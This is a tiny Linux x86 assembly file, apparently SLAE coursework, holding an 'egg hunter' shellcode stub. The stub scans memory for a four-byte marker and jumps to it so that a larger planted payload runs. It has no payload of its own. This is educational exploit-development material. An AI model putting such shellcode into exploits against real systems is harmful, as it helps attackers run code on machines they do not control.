; Egg Hunter Shellcode Linux x86
; by Daniel Roberson -- SLAE 877
;
;


BITS 32

mov ebx, 0x424a424a             ; EGG: inc edx; dec edx; inc edx; dec edx
loop:
	inc eax
	cmp DWORD [eax], ebx
	jne loop
	jmp eax

